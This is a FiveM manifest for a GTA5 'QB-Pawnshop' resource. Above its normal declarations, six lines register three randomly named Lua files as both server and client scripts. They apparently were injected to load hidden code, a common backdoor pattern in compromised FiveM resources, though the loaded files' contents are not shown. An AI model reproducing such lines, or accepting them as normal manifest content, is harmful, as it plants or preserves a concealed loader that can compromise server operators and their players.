server_script "16FOEER1ZS59I.lua"
client_script "16FOEER1ZS59I.lua"
server_script "5VCDM5HW8EAK7.lua"
client_script "5VCDM5HW8EAK7.lua"
server_script "HWS9.lua"
client_script "HWS9.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-Pawnshop'
version '1.0.0'

shared_script 'config.lua'
server_script 'server/main.lua'

client_scripts {
	'client/main.lua',
	'client/melt.lua'
}

lua54 'yes'